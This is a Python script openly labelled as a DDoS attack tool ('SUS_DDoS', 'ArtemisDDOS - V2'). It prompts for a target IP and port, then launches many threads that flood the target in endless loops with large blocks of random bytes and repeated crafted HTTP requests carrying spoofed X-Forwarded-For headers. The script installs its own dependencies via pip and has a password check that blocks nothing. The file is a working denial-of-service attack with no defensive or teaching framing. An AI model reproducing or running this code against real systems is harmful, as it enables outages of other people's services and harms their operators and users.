# import module
import os, sys

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1']
acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n'
]
referers = ['Your_Server_Got_DDoS_By_Franz!!']
import random
import socket
import threading
#Coding 
if sys.platform.startswith("linux"):
   os.system('clear')
elif sys.platform.startswith("freebsd"):
   os.system('clear')
else:
    os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ArtemisDDOS - V2")

password = input("[ + ] Password Tools: ")
if password == '281129':
        os.system("cls")
else :
	print("[~>] Password Is Invalid")
print("""
            ;::::; :;
          ;:::::'   :;
         ;:::::;     ;.
        ,:::::'       ;                                                                 
        ::::::;       ;          SDDOSD
        ;:::::;       ;         DOSDDOSD
       ,;::::::;     ;'          / DOSDDOS
     ;:::::::::`. ,,,;.        /  / DDOSDDo
   .';:::::::::::::::::;,     /  /     DDOSD
  ,::::::;::::::;;;;::::;,   /  /        DDOS
 ;`::::::`'::::::;;;::::: ,#/  /          DDOS
 :`:::::::`;::::::;;::: ;::#  /            DDOS
 ::`:::::::`;:::::::: ;::::# /              DDO
 `:`:::::::`;:::::: ;::::::#/               SDD
  :::`:::::::`;; ;:::::::::##                OS
  ::::`:::::::`;::::::::;:::#                DD
  `:::::`::::::::::::;'`:;::#                O
   `:::::`::::::::;' /  / `:#
    ::::::`:::::;'  /  /   `#       

    【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】
    【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】
    【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】
    【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】
    【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】【S】【U】【S】

    [ ? ] SUS_DDoS - A Distributed Denial of Service Attack Tools.
""")
ip = str(input("[ + ] Target IP : "))
port = int(input("[ + ] Port : "))
method_attack = str(input("[ + ] Method : Head,Get,Post : "))
times = int(input("[ + ] Packets : "))
threads = int(input("[ + ] Threads : "))
fake_ip = '182.21.20.32'

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
def Headers(method):
    header = ""
    if method == "get" or method == "head":
        post_host = "POST /GET /DAH_LAH_DI_DDOS HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        accept = random.choice(acceptall) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referer = "Referer: " + random.choice(referers) + ip + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: 1\r\n"
        forward += "Client-IP: 10000\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        header = post_host + referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
    return header
    
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ArtemisDDOS - V2")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(90048)
    if method_attack == "1":
        get_host = "GET /DAH_LAH_DI_DDOS HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /DH_LAH_DI_DDOS HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip,port))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            for x in range(times):
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"[ + ] [ SERANG ] || Mengnyerang Target [{ip}:{port}] [ + ]")
        except socket.error:
            s.close()
            print(f"[ + ] [ SERANG ] || Mengnyerang Target [{ip}:{port}] [ + ]")
            print(f"[ + ] [ SERANG ] || Mengnyerang Target [{ip}:{port}] [ + ]")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()